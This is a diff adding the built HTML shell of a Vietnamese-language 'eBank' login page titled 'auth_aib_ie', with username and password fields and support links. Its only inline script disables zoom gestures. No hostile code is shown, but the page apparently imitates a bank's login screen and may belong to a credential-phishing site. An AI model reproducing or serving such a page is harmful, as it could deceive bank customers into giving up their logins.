@@ -1,0 +1,18 @@
+<html lang=""><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0;" name="viewport"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" href="/logo.png"><title>auth_aib_ie</title><script>window.onload=function () {
+              document.addEventListener('touchstart',function (event) {
+                  if(event.touches.length>1){
+                      event.preventDefault();
+                  }
+              });
+              let lastTouchEnd=0;
+              document.addEventListener('touchend',function (event) {
+                  let now=(new Date()).getTime();
+                  if(now-lastTouchEnd<=300){
+                      event.preventDefault();
+                  }
+                  lastTouchEnd=now;
+              },false);
+              document.addEventListener('gesturestart', function (event) {
+                  event.preventDefault();
+              });
+          }</script><script defer="defer" src="/js/chunk-vendors.aab866fd.js"></script><script defer="defer" src="/js/app.02d58680.js"></script><link href="/css/chunk-vendors.51cfabe9.css" rel="stylesheet"><link href="/css/app.5ab44e2c.css" rel="stylesheet"><link rel="stylesheet" type="text/css" href="/css/549.ad74c8ec.css"></head><body><noscript><strong>We're sorry but auth_aib_ie doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app" data-v-app=""><div class="container" data-v-641879bb=""><div class="logo_box" data-v-641879bb=""><img src="/img/logo.9c490c96.svg" alt="" data-v-641879bb=""></div><div class="input_box" data-v-641879bb=""><label data-v-641879bb="">Chào mừng đến eBank!</label><div class="input_item" data-v-641879bb=""><input type="text" placeholder="Tên đăng nhập" data-v-641879bb=""><img src="/img/ic_support.99266cfe.svg" alt="" data-v-641879bb=""></div><div class="input_item" data-v-641879bb=""><input type="password" placeholder="Mật khẩu" data-v-641879bb=""><img src="/img/ic_eye.08093843.svg" alt="" data-v-641879bb=""></div><a href="javascript:void(0);" class="tip" data-v-641879bb="">Quên mật khẩu?</a><button data-v-641879bb="">Đăng Nhập</button></div><div class="foot" data-v-641879bb=""><div class="item" data-v-641879bb=""><img src="/img/ic_support.99266cfe.svg" alt="" data-v-641879bb=""><label data-v-641879bb="">1900&nbsp;&nbsp;58&nbsp;&nbsp;58&nbsp;&nbsp;85</label></div><div class="item" data-v-641879bb=""><img src="/img/ic_search_location.999ee847.svg" alt="" data-v-641879bb=""><label data-v-641879bb="">Tìm điểm giao dịch</label></div><div class="item" data-v-641879bb=""><img src="/img/ic_scale.ef9509a0.svg" alt="" data-v-641879bb=""><label data-v-641879bb="">Tra cứu tỷ giá</label></div></div><!----><!----></div></div></body></html>
